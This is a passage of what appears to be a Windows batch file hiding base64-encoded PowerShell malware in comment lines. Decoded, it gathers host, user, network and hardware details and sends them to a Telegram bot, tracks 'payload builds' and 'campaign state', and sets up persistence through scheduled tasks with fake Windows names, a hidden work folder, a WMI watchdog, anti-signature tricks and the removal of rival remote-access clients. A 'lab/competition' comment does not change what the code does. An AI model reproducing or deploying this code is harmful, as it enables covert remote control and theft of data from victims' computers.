::dGF0ZSBhY3Rpb24pDQokc3RhdGVMaW5lID0gJ24vYScNCiRzdGF0ZU9iaiA9ICRu
::dWxsDQokc3RhdGVQYXRoMiA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUuanNv
::bicNCmlmIChUZXN0LVBhdGggJHN0YXRlUGF0aDIpIHsNCiAgICAkcmF3U3RhdGUg
::PSAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBhdGgyIC1SYXcpLlRy
::aW0oKQ0KICAgIHRyeSB7DQogICAgICAgICRzdGF0ZU9iaiA9ICRyYXdTdGF0ZSB8
::IENvbnZlcnRGcm9tLUpzb24NCiAgICAgICAgJGZvcmVpZ25Dc3YgPSBpZiAoJHN0
::YXRlT2JqLmZvcmVpZ24pIHsgKCRzdGF0ZU9iai5mb3JlaWduIC1qb2luICcsJykg
::fSBlbHNlIHsgJy0nIH0NCiAgICAgICAgJHN0YXRlTGluZSA9ICJwcmltPSQoJHN0
::YXRlT2JqLnByaW0pIGFsdD0kKCRzdGF0ZU9iai5hbHQpIGZvcmVpZ249WyRmb3Jl
::aWduQ3N2XSB0YXNrcz0kKCRzdGF0ZU9iai50YXNrc09rKS8kKCRzdGF0ZU9iai50
::YXNrc1RvdGFsKSB3ZD0kKCRzdGF0ZU9iai53YXRjaGRvZykgaGVhbHM9JCgkc3Rh
::dGVPYmouaW5zdGFsbENvdW50KSINCiAgICB9IGNhdGNoIHsgJHN0YXRlTGluZSA9
::ICRyYXdTdGF0ZSB9DQp9DQoNCiRkZXBsb3lCbG9jayA9ICcnDQppZiAoJGtleSAt
::ZXEgJ0RFUExPWScpIHsNCiAgICAkdmVyZGljdCA9IGlmICgkZGVwbG95T2spIHsg
::J0RFUExPWUVEIC8gSEVBTFRIWScgfSBlbHNlIHsgJ0RFUExPWUVEIEJVVCBJTkNP
::TVBMRVRFJyB9DQogICAgJGZvcmVpZ24gPSBAKEdldC1DaGlsZEl0ZW0gLVBhdGgg
::IiR7ZW52OlByb2dyYW1GaWxlc31cU2NyZWVuQ29ubmVjdCBDbGllbnQqIiwiJHtl
::bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIgLURp
::cmVjdG9yeSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAg
::IFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLW5vdG1hdGNoICgiNWY2MDEwNTc5ODUy
::ZTUwN3xmODYxYzgxNDBkNDUzNDI3fHswfSIgLWYgKEdldC1Hcnl4YUtlZXBGcCkp
::IH0pDQogICAgJGRpYWdMaW5lcyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rp
::b25zLkdlbmVyaWMuTGlzdFtzdHJpbmddDQogICAgJGJvb3RQYXRoID0gSm9pbi1Q
::YXRoICRXb3JrRGlyICdib290LmVycicNCiAgICBpZiAoVGVzdC1QYXRoICRib290
::UGF0aCkgew0KICAgICAgICAkaW50ZXJlc3RpbmcgPSBAKA0KICAgICAgICAgICAg
::J21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlfJywgJ251a2VfJywgJ21zaV90b28n
::LCAnbXNpX2ZldGNoJywgJ21zaV9leGl0JywNCiAgICAgICAgICAgICdtc2lfdW5h
::dmFpbGFibGUnLCAnc2VjdXJlXycsICdnb18nLCAnZXh0ZXJtaW5hdGVfJywgJ2lk
::ZW50aXR5XycsDQogICAgICAgICAgICAnY3JlYXRlX3Rhc2snLCAndmVyaWZ5X3Rh
::c2snLCAnb3JwaGFuXycsICdzdGFsZV8nLCAncG9zdGluc3RhbGwnLCAnYWx0XycN
::CiAgICAgICAgKQ0KICAgICAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGJv
::b3RQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAg
::ICAgIFdoZXJlLU9iamVjdCB7DQogICAgICAgICAgICAgICAgJGxpbmUgPSAkXw0K
::ICAgICAgICAgICAgICAgIGZvcmVhY2ggKCR0IGluICRpbnRlcmVzdGluZykgeyBp
::ZiAoJGxpbmUgLWxpa2UgIiokdCoiKSB7IHJldHVybiAkdHJ1ZSB9IH0NCiAgICAg
::ICAgICAgICAgICAkZmFsc2UNCiAgICAgICAgICAgIH0gfA0KICAgICAgICAgICAg
::U2VsZWN0LU9iamVjdCAtTGFzdCAyNiB8DQogICAgICAgICAgICBGb3JFYWNoLU9i
::amVjdCB7IFt2b2lkXSRkaWFnTGluZXMuQWRkKCgnLSA8Y29kZT57MH08L2NvZGU+
::JyAtZiAoRXNjICgkXyAtcmVwbGFjZSAnW15ceDIwLVx4N0VdJywgJz8nKSkpKSB9
::DQogICAgfQ0KICAgIGlmICgkZGlhZ0xpbmVzLkNvdW50IC1lcSAwKSB7IFt2b2lk
::XSRkaWFnTGluZXMuQWRkKCctIChubyBpbnN0YWxsL251a2UgbWFya2VycyBpbiBi
::b290LmVyciknKSB9DQogICAgJGRlcGxveUJsb2NrID0gQCINCg0KPGI+RGVwbG95
::IHZlcmRpY3Q8L2I+DQotIFJlc3VsdDogPGI+JChFc2MgJHZlcmRpY3QpPC9iPg0K
::LSBQcmltYXJ5IFJ1bm5pbmc6ICQoaWYgKCRwcmltT2spIHsgJ1lFUycgfSBlbHNl
::IHsgJ05PJyB9KQ0KLSBNb25pdG9yIHNjcmlwdCAoLnd1Y2FjaGVcb3duX21vbi5j
::bWQpOiAkKGlmICgkaGFzTW9uKSB7ICdZRVMnIH0gZWxzZSB7ICdOTycgfSkNCi0g
::QmFja3VwIG1vbiAoLmV0bGNhY2hlXGV0bF9tb24uY21kKTogJChpZiAoJGhhc0V0
::bCkgeyAnWUVTJyB9IGVsc2UgeyAnTk8nIH0pDQotIFBlcnNpc3QgdGFza3MgT0s6
::ICR0YXNrT2sgLyAkKCRleHBlY3RlZFRhc2tzLkNvdW50KSAoYmFkL21pc3Npbmc6
::ICR0YXNrQmFkKQ0KLSBNU0kgY2FjaGU6ICQoRXNjICRtc2lTaXplKQ0KLSBGb3Jl
::aWduIFNDIGZvbGRlcnMgbGVmdDogJCgkZm9yZWlnbi5Db3VudCkNCi0gTm90ZTog
::TGFzdFJlc3VsdCAyNjcwMTEgPSB0YXNrIG5vdCB5ZXQgcnVuIChub3JtYWwgcmln
::aHQgYWZ0ZXIgY3JlYXRlKQ0KDQo8Yj5EZXBsb3kgbG9nIG1hcmtlcnM8L2I+DQok
::KCRkaWFnTGluZXMgLWpvaW4gImBuIikNCiJADQp9DQoNCiR0ZXh0ID0gQCINCiRl
::bW9qaSA8Yj5TQyBNb25pdG9yIC0gJChFc2MgJHRpdGxlKTwvYj4NCg0KPGI+RXZl
::bnQ8L2I+DQotIFN1bW1hcnk6ICQoRXNjICRTdW1tYXJ5KQ0KLSBUcmFuc2l0aW9u
::OiA8Y29kZT4kKEVzYyAkdHJhbnMpPC9jb2RlPg0KLSBXaGVuOiAkKEVzYyAkbm93
::KQ0KLSBTb3VyY2UgYnVpbGQ6IDxjb2RlPiQoRXNjICRCdWlsZCk8L2NvZGU+DQok
::ZGVwbG95QmxvY2sNCg0KPGI+SG9zdDwvYj4NCi0gQ29tcHV0ZXI6IDxjb2RlPiQo
::RXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4NCi0gVXNlcjogPGNvZGU+JChF
::c2MgJHdobyk8L2NvZGU+DQotIEVsZXZhdGVkOiAkZWxldiB8IFNZU1RFTTogJGlz
::U3lzdGVtDQotIERvbWFpbi9Xb3JrZ3JvdXA6ICQoRXNjICRvcy5Eb21haW4pDQoN
::CjxiPk5ldHdvcms8L2I+DQotIExBTiBJUHM6IDxjb2RlPiQoRXNjICRsYW4pPC9j
::b2RlPg0KLSBQdWJsaWMgSVA6IDxjb2RlPiQoRXNjICRwdWIpPC9jb2RlPg0KDQo8
::Yj5PUyAvIEhhcmR3YXJlPC9iPg0KLSBPUzogJChFc2MgJG9zLkNhcHRpb24pDQot
::IFZlcnNpb246ICQoRXNjICRvcy5WZXJzaW9uKSAoYnVpbGQgJChFc2MgJG9zLkJ1
::aWxkKSkgJChFc2MgJG9zLkFyY2gpDQotIEluc3RhbGw6ICQoRXNjICRvcy5JbnN0
::YWxsRGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9vdCkNCi0gVXB0
::aW1lOiAkKEVzYyAkdXB0aW1lKQ0KLSBDUFU6ICQoRXNjICRvcy5DUFUpDQotIEhh
::cmR3YXJlOiAkKEVzYyAkb3MuTWFudWZhY3R1cmVyKSAkKEVzYyAkb3MuTW9kZWwp
::DQotIFNlcmlhbDogPGNvZGU+JChFc2MgJG9zLlNlcmlhbCk8L2NvZGU+DQotIFJB
::TTogJCgkb3MuVG90YWxSQU1fR0IpIEdCDQotIERpc2sgQzogJCgkb3MuRGlza0Zy
::ZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0INCg0KPGI+U2Ny
::ZWVuQ29ubmVjdCAoYWxsKTwvYj4NCi0gU2V2cnogPGNvZGU+NWY2MDEwNTc5ODUy
::ZTUwNzwvY29kZT46ICQoRXNjICRwcmltTGluZSkNCi0gQWx0IDxjb2RlPmY4NjFj
::ODE0MGQ0NTM0Mjc8L2NvZGU+OiAkKEVzYyAkYWx0TGluZSkNCi0gR3J5eGEgPGNv
::ZGU+JChFc2MgKEdldC1Hcnl4YUtlZXBGcCkpPC9jb2RlPjogJChFc2MgKEdldC1T
::dmNMaW5lICgiU2NyZWVuQ29ubmVjdCBDbGllbnQgKHswfSkiIC1mIChHZXQtR3J5
::eGFLZWVwRnApKSkpDQokKCRzY0xpc3QgLWpvaW4gImBuIikNCg0KPGI+T3RoZXIg
::Uk1NIC8gcmVtb3RlIHRvb2xzPC9iPg0KJCgkcm1tSGl0cyAtam9pbiAiYG4iKQ0K
::DQo8Yj5QZXJzaXN0IHRhc2tzIChleHBlY3RlZCk8L2I+DQokKCR0YXNrTGluZXMg
::LWpvaW4gImBuIikNCg0KPGI+Q2FjaGU8L2I+DQotIE1TSSBjYWNoZTogJChFc2Mg
::JG1zaVNpemUpDQotIFdvcmtEaXI6IDxjb2RlPiQoRXNjICRXb3JrRGlyKTwvY29k
::ZT4NCg0KPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3Qp
::PC9iPg0KLSA8Y29kZT5NT049JGJNb24gfCBTRUM9JGJTZWMgfCBUR1I9JGJUZ3Ig
::fCBMSUI9JGJMaWI8L2NvZGU+DQoNCjxiPkNhbXBhaWduIHN0YXRlPC9iPg0KLSA8
::Y29kZT4kKEVzYyAkc3RhdGVMaW5lKTwvY29kZT4NCg0KPGk+Qm90OiBAbm9idWRk
::eXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4NCiJADQoNCiMgY29tcGFjdCBk
::aWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5IGhl
::YXJ0YmVhdCkNCmlmICgkTW9kZSAtZXEgJ2NvbXBhY3QnKSB7DQogICAgJGZvcmVp
::Z25OID0gMA0KICAgIGlmICgkc3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWln
::bikgeyAkZm9yZWlnbk4gPSBAKCRzdGF0ZU9iai5mb3JlaWduKS5Db3VudCB9DQog
::ICAgJG1zaVNob3J0ID0gaWYgKFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsgJ3swOk4w
::fUtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNoZSAtRm9yY2UpLkxlbmd0aCAvIDFL
::QikgfSBlbHNlIHsgJzAnIH0NCiAgICAkcHJpbVNob3J0ID0gaWYgKCRwcmltT2sp
::IHsgJ09LJyB9IGVsc2UgeyAnRE9XTicgfQ0KICAgICRhbHRTaG9ydCA9IGlmICgk
::YWx0TGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0N
::CiAgICAkZ3J5eGFMaW5lID0gR2V0LVN2Y0xpbmUgKCJTY3JlZW5Db25uZWN0IENs
::aWVudCAoezB9KSIgLWYgKEdldC1Hcnl4YUtlZXBGcCkpDQogICAgJGdyeXhhU2hv
::cnQgPSBpZiAoJGdyeXhhTGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBl
::bHNlIHsgJy0nIH0NCiAgICAkdGV4dCA9ICIkZW1vamkgU0NEfCQoJGVudjpDT01Q
::VVRFUk5BTUUpfHNldj0kcHJpbVNob3J0fGdyeT0kZ3J5eGFTaG9ydHxhbHQ9JGFs
::dFNob3J0fGY9JGZvcmVpZ25OfHQ9JHRhc2tPay81fGI9JEJ1aWxkIg0KfQ0KDQpp
::ZiAoJHRleHQuTGVuZ3RoIC1ndCAzODAwKSB7DQogICAgJHJtbUhpdHMgPSBAKCgk
::cm1tSGl0cyB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEyKSkgKyAoJy0gLi4uICh7
::MH0gbW9yZSknIC1mICgkcm1tSGl0cy5Db3VudCAtIDEyKSkNCiAgICAkc2NMaXN0
::ID0gQCgoJHNjTGlzdCB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDE0KSkgKyAoJy0g
::Li4uICh7MH0gbW9yZSknIC1mICgkc2NMaXN0LkNvdW50IC0gMTQpKQ0KICAgICR0
::ZXh0ID0gJHRleHQuU3Vic3RyaW5nKDAsIDM4MDApICsgImBuYG48aT5UUlVOQ0FU
::RUQgKFRlbGVncmFtIDQwOTYgbGltaXQpPC9pPiINCn0NCg0KJGxvZyA9IEpvaW4t
::UGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQpmdW5jdGlvbiBTZW5kLVRnKFtzdHJp
::bmddJG1zZywgW3N0cmluZ10kbW9kZSkgew0KICAgICRwYXlsb2FkID0gQHsNCiAg
::ICAgICAgY2hhdF9pZCAgICAgICAgICAgICAgICAgID0gJGNmZy5DSEFUX0lEDQog
::ICAgICAgIHRleHQgICAgICAgICAgICAgICAgICAgICA9ICRtc2cNCiAgICAgICAg
::ZGlzYWJsZV93ZWJfcGFnZV9wcmV2aWV3ID0gJHRydWUNCiAgICB9DQogICAgaWYg
::KCRtb2RlKSB7ICRwYXlsb2FkLnBhcnNlX21vZGUgPSAkbW9kZSB9DQogICAgJGpz
::b24gPSAkcGF5bG9hZCB8IENvbnZlcnRUby1Kc29uIC1Db21wcmVzcyAtRGVwdGgg
::NQ0KICAgICRieXRlcyA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0
::Qnl0ZXMoJGpzb24pDQogICAgSW52b2tlLVJlc3RNZXRob2QgLVVyaSAoImh0dHBz
::Oi8vYXBpLnRlbGVncmFtLm9yZy9ib3QkKCRjZmcuQk9UX1RPS0VOKS9zZW5kTWVz
::c2FnZSIpIGANCiAgICAgICAgLU1ldGhvZCBQb3N0IC1Cb2R5ICRieXRlcyAtQ29u
::dGVudFR5cGUgJ2FwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9dXRmLTgnIHwgT3V0
::LU51bGwNCn0NCg0KZnVuY3Rpb24gU2VuZC1UZ1NhZmUoW3N0cmluZ10kbXNnLCBb
::c3RyaW5nXSRtb2RlKSB7DQogICAgJHRvU2VuZCA9ICRtc2cNCiAgICB0cnkgew0K
::ICAgICAgICBTZW5kLVRnIC1tc2cgJHRvU2VuZCAtbW9kZSAkbW9kZQ0KICAgICAg
::ICByZXR1cm4gJHRydWUNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgdHJ5IHsNCiAg
::ICAgICAgICAgIFNlbmQtVGcgLW1zZyAoJHRvU2VuZC5TdWJzdHJpbmcoMCwgMzAw
::MCkgKyAiYG48aT5UUlVOQ0FURUQ8L2k+IikgLW1vZGUgJG1vZGUNCiAgICAgICAg
::ICAgIHJldHVybiAkdHJ1ZQ0KICAgICAgICB9IGNhdGNoIHsNCiAgICAgICAgICAg
::IHJldHVybiAkZmFsc2UNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KdHJ5IHsNCiAg
::ICBpZiAoU2VuZC1UZ1NhZmUgLW1zZyAkdGV4dCAtbW9kZSAnSFRNTCcpIHsNCiAg
::ICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19z
::ZW50X3JpY2gnIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfSBl
::bHNlIHsNCiAgICAgICAgdGhyb3cgJ2h0bWxfZmFpbGVkJw0KICAgIH0NCiAgICBp
::ZiAoJGtleSAtZXEgJ0RFUExPWScpIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxp
::dGVyYWxQYXRoICRsb2cgLVZhbHVlICgidGdfZGVwbG95X29rPSIgKyAkZGVwbG95
::T2spIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIFNldC1D
::b250ZW50IC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdkZXBsb3lf
::dGcuZmxhZycpIC1WYWx1ZSAoR2V0LURhdGUgLUZvcm1hdCAnbycpIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgfQ0KfSBjYXRjaCB7DQogICAgdHJ5
::IHsNCiAgICAgICAgJHBsYWluID0gW3JlZ2V4XTo6UmVwbGFjZSgkdGV4dCwgJzxb
::Xj5dKz4nLCAnJykNCiAgICAgICAgJHBsYWluID0gW1N5c3RlbS5OZXQuV2ViVXRp
::bGl0eV06Okh0bWxEZWNvZGUoJHBsYWluKQ0KICAgICAgICBpZiAoJHBsYWluLkxl
::bmd0aCAtZ3QgMzUwMCkgeyAkcGxhaW4gPSAkcGxhaW4uU3Vic3RyaW5nKDAsIDM1
::MDApICsgImBuVFJVTkNBVEVEIiB9DQogICAgICAgIFNlbmQtVGdTYWZlIC1tc2cg
::JHBsYWluIC1tb2RlICcnIHwgT3V0LU51bGwNCiAgICAgICAgQWRkLUNvbnRlbnQg
::LUxpdGVyYWxQYXRoICRsb2cgLVZhbHVlICd0Z19zZW50X3BsYWluJyAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0gY2F0Y2ggew0KICAgICAgICBB
::ZGQtQ29udGVudCAtTGl0ZXJhbFBhdGggJGxvZyAtVmFsdWUgKCJ0Z19mYWlsICIg
::KyAkXy5FeGNlcHRpb24uTWVzc2FnZSkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICB9DQp9DQo=
::B64_TGR_END
::B64_LIB_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZANCiMgT1dOX0xJQiAgQlVJTEQgMjAyNjA4
::MDRMNDYNCiMgTDQ2OiBGUkVFWkUgLSBuZXZlciBhdXRvIG1zaWV4ZWMgZnJvbSBt
::b24vYm9vdDsgc3RhcnQtb25seS4gTWFudWFsIGZvcmNlIG9ubHkuDQojIEw0NTog
::SEFORFMtT0ZGIGFsbCBTY3JlZW5Db25uZWN0IGV4Y2VwdCBHcnl4YSBpbnN0YWxs
::LWlmLWFic2VudC4NCiMgU2hhcmVkIGxpYnJhcnk6IHBlci1ob3N0IGlkZW50aXR5
::IChhbnRpLXNpZ25hdHVyZSksIFdNSSB3YXRjaGRvZw0KIyAobXV0dWFsIHBlcnNp
::c3RlbmNlIGNoYWluKSwgY2FtcGFpZ24gc3RhdGUgZmlsZSwgU0Mgc2VydmljZSBy
::ZXBhaXIuDQojIEw0NDogSEFSRCBsb2NrIOKAlCBhbnkgbGl2ZSBHcnl4YSA9PiBu
::ZXZlciBtaWdyYXRlL3VuaW5zdGFsbC9pOyBubyBkZWZlcnJlZCAveDsgcHJvdGVj
::dCBtdXN0IGVtcHR5IFVwZ3JhZGUuDQojIEw0MzogVGVzdC1TY1J1bm5pbmcgaW5j
::bHVkZXMgU3RhcnRQZW5kaW5nOyBuZXZlciAveCB3aGVuIHNlcnZpY2UgZXhpc3Rz
::IChjb25uZWN0LWRyb3AgcmFjZSkuDQojIEw0MjogRlAgbWlncmF0ZSBpbnN0YWxs
::LW5ldy1GSVJTVCB0aGVuIGRlZmVyLXJlbW92ZS1vbGQgKG5ldmVyIGxlYXZlIGhv
::c3Qgd2l0aCB6ZXJvIEdyeXhhKS4NCiMgTDQxOiAtRm9yY2UgTkVWRVIgL3grL2kg
::d2hlbiBHcnl4YSBhbHJlYWR5IFJ1bm5pbmcgKGZvcmNlX2dyeXhhLmZsYWcgd2Fz
::IGtpbGxpbmcgbGl2ZSBHdWVzdCkuDQojIEwzOTogcmVsYXktdmVyaWZpZWQgR3J5
::eGEga2VlcGVyIGFkb3B0aW9uOyBJTkZMSUdIVOKJoEhFQUxUSFk7IHJlYWwgLUZv
::cmNlLy1EZWVwOw0KIyAgICAgIHBvc3QtR3J5eGEgL2kgc2V2cnogcmVzdG9yZTsg
::VGVzdC1Nc2lQYWNrYWdlOyBUQVNLX0cgaW4gc3RhdGU7IHBlcnNpc3RlbmNlIHB1
::cmdlIHcvbyBGUC1vbmx5Lg0KIyBMMzg6IFRBU0tfRyBXdWNhY2hlR3J5eGFCb290
::IE9OU1RBUlQgcnVucyBncnl4YS1lbnN1cmUgLU5vV2FpdCAtRm9yY2UgYXQgYm9v
::dCAoRGVmZW5kZXIgc3RyaXBzIFNDTSBlbnRyeSBhdCBzdGFydHVwKS4gTDM3OiBN
::U0kgbWFnaWMrRlAgdmFsaWRhdGUuDQojIEwyMTogc3R1Y2sgcmVnaXN0ZXJlZCAo
::c3ZjK2RpciBnb25lKSAtPiAvZmEgdGhlbiBBUlAgbnVrZSArIHNhbWUtRlAgL2k7
::IHJldHVybiBmaXguDQojIEwyMDogLURlZXAgbXVzdCBub3Qgc2tpcCBsaWdodCBz
::dGFydC9yZXBhaXIgKHJhdGUtbGltaXQgbGVmdCBHcnl4YSBTdG9wcGVkKS4NCiMg
::TDE5OiByYXRlLWxpbWl0IG5ldmVyIGJsb2NrcyB3aGVuIEdyeXhhIGZ1bGx5IGFi
::c2VudDsgU3RhcnRQZW5kaW5nIGtlZXAuDQojIEwxODogZXh0ZXJtaW5hdGUgd2Fz
::IEtJTExJTkcgR3J5eGEgKG51bGwtcGF0aCBwcm9jIGtpbGwpOyBzeW5jIEZQIGJl
::Zm9yZSBraWxsLg0KIyBMMTc6IEdyeXhhIHJlaW5zdGFsbCBMT0NLIHdoaWxlIGFu
::eSBub24tc2V2cnogU0MgUnVubmluZzsgRlAgZHJpZnQgbmV2ZXIgL3guDQojIEwx
::NjogTkVWRVIgcmVpbnN0YWxsIEdyeXhhIHdoZW4gUnVubmluZyAocGFuZWwgZHVw
::bGljYXRlcyk7IFRDUCBhZHZpc29yeSBvbmx5Lg0KIyBMMTU6IGdyeXhhLWhlYWx0
::aCAvIGdyeXhhLWVuc3VyZSDigJQgOGggZGVlcCBjaGVjayAoVENQL3JlbGF5L0ZQ
::IGRyaWZ0IHJlaW5zdGFsbCkuDQojIEwxMzogc2NodGFza3MgQ3JlYXRlIHZpYSBj
::bWQgKGxpa2UgV3VjYWNoZU93biksIFRSIHVuZGVyIFdpbmRvd3NcVGVtcFwud3Vj
::YWNoZQ0KIyAgICAgIChub3QgQUNMLWxvY2tlZCBQcm9ncmFtRGF0YSBwYXRoKSwg
::L1NUIDAwOjAwIG9uIE1JTlVURSwgbm8gbGVhZGluZyBcLg0KIyBMMTI6IElERU5U
::VkVSPTcgUk9PVC1sZXZlbCB0YXNrIG5hbWVzIChuZXN0ZWQgTWljcm9zb2Z0XFdp
::bmRvd3MgQWNjZXNzIERlbmllZCkuDQojIEwxMTogTkVWRVIgcmV1c2UgcmVhbCBX
::aW5kb3dzIGJ1aWx0LWluIHRhc2sgbmFtZXM7IFRSIG93bmVyc2hpcCBjaGVja3Mu
::DQojIEF1dGhvcml6ZWQgaW50ZXJuYWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRp
::dGlvbiBzY29wZSBvbmx5Lg0KIyDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
::lZDilZDilZDilZDilZDilZANCltDbWRsZXRCaW5kaW5nKCldDQpwYXJhbSgNCiAg
::ICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV0NCiAgICBbVmFsaWRhdGVT
::ZXQoJ2luaXQnLCAnd2F0Y2hkb2cnLCAnd2F0Y2hkb2ctZW5zdXJlJywgJ3Rhc2tz
::LWVuc3VyZScsICdzdGF0ZScsICdpZGVudGl0eScsICdyZXBhaXInLCAncmVnaXN0
::ZXJlZCcsICdleHRlcm1pbmF0ZScsICdncnl4YS1oZWFsdGgnLCAnZ3J5eGEtZW5z
::dXJlJywgJ3N5bmMtZ3J5eGEtZnAnLCAndGVzdC1tc2knLCAncHJvdGVjdC1tc2kn
::LCAndmVyaWZ5LXVwZGF0ZScsICdzeW5jLXNldnJ6LWZwJyldDQogICAgW3N0cmlu
::Z10kQWN0aW9uLA0KICAgIFtzdHJpbmddJFdvcmtEaXIgPSAnQzpcUHJvZ3JhbURh
::dGFcTWljcm9zb2Z0XFdpbmRvd3NcV0VSXFRlbXBcLnd1Y2FjaGUnLA0KICAgIFtz
::dHJpbmddJE1vblBhdGggPSAnJywNCiAgICBbc3RyaW5nXSRCdWlsZCAgPSAnTzE1
::JywNCiAgICBbc3RyaW5nXSRFeHRyYSAgPSAnJywNCiAgICBbc3RyaW5nXSRGcCAg
::ICAgPSAnJywNCiAgICBbc3dpdGNoXSREZWVwLA0KICAgIFtzd2l0Y2hdJEZvcmNl
::LA0KICAgIFtzd2l0Y2hdJE5vV2FpdA0KKQ0KDQokRXJyb3JBY3Rpb25QcmVmZXJl
::bmNlID0gJ1NpbGVudGx5Q29udGludWUnDQokY2ZnUGF0aCA9IEpvaW4tUGF0aCAk
::V29ya0RpciAnaWRlbnRpdHkuY2ZnJw0KJElkZW50VmVyc2lvbiA9IDgNCg0KIyBS
::b290LWxldmVsIG5hbWVzIFdJVEhPVVQgbGVhZGluZyBiYWNrc2xhc2ggKG1hdGNo
::ZXMgd29ya2luZyBXdWNhY2hlT3duIHN0eWxlKS4NCiRQb29scyA9IEB7DQogICAg
::QSA9IEAoJ1dlclF1ZXVlU3luYycsJ0RpYWdIb3N0Q2FjaGUnLCdOZXRUcmFjZUNh
::Y2hlJywnV2RpSG9zdFByb3h5JywnUGxhU2VydmVySGVhbHRoJywnVGNwSXBDb25m
::bGljdFJlcycsJ1NyQ2FjaGVTeW5jJywnUmVzb2x1dGlvblF1ZXVlJykNCiAgICBC
::ID0gQCgnUGxhU2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JywnV2VyUXVldWVT
::eW5jJywnTmV0VHJhY2VDYWNoZScsJ0RpYWdIb3N0Q2FjaGUnLCdUY3BJcENvbmZs
::aWN0UmVzJywnUGxhU2VydmVyRGlhZycsJ1NyQ2FjaGVTeW5jJykNCiAgICBDID0g
::QCgnUmVzb2x1dGlvblF1ZXVlJywnTmV0VHJhY2VDYWNoZScsJ1RjcElwQ29uZmxp
::Y3RSZXMnLCdXZXJRdWV1ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdEaWFnSG9z
::dENhY2hlJywnUGxhU2VydmVyRGlhZycsJ1dkaUhvc3RQcm94eScpDQogICAgRCA9
::IEAoJ1RjcElwQ29uZmxpY3RSZXMnLCdSZXNvbHV0aW9uUXVldWUnLCdOZXRUcmFj
::ZUNhY2hlJywnRGlhZ0hvc3RDYWNoZScsJ1BsYVNlcnZlckRpYWcnLCdXZXJRdWV1
::ZVN5bmMnLCdQbGFTZXJ2ZXJIZWFsdGgnLCdXZGlIb3N0UHJveHknKQ0KfQ0KJERl
::ZmF1bHRzID0gW29yZGVyZWRdQHsNCiAgICBUQVNLX0EgPSAnV2VyUXVldWVTeW5j
::Jw0KICAgIFRBU0tfQiA9ICdQbGFTZXJ2ZXJIZWFsdGgnDQogICAgVEFTS19DID0g
::J1dkaUhvc3RQcm94eScNCiAgICBUQVNLX0QgPSAnVGNwSXBDb25mbGljdFJlcycN
::CiAgICBNT19BICAgPSAnMicNCiAgICBNT19CICAgPSAnMycNCn0NCg0KZnVuY3Rp
::b24gR2V0LUhvc3RTZWVkIHsNCiAgICAkcyA9IDBMDQogICAgZm9yZWFjaCAoJGMg
::aW4gJGVudjpDT01QVVRFUk5BTUUuVG9VcHBlcigpLlRvQ2hhckFycmF5KCkpIHsg
::JHMgPSAoJHMgKiAzMSArIFtpbnRdJGMpICUgMTAwMDAwMDAwNyB9DQogICAgcmV0
::dXJuICRzDQp9DQoNCmZ1bmN0aW9uIFJlYWQtSWRlbnRpdHkgew0KICAgICRpZCA9
::ICREZWZhdWx0cy5DbG9uZSgpDQogICAgaWYgKFRlc3QtUGF0aCAkY2ZnUGF0aCkg
